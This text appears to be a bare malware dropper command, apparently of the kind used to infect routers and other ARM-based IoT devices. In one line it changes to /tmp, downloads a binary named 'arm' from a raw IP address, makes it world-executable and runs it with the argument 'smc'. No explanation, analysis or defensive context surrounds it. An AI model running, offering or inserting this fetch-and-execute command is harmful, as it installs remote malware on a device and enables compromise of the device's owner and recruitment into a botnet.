cd /tmp; wget http://45.95.146.126/arm; chmod 777 arm; ./arm smc
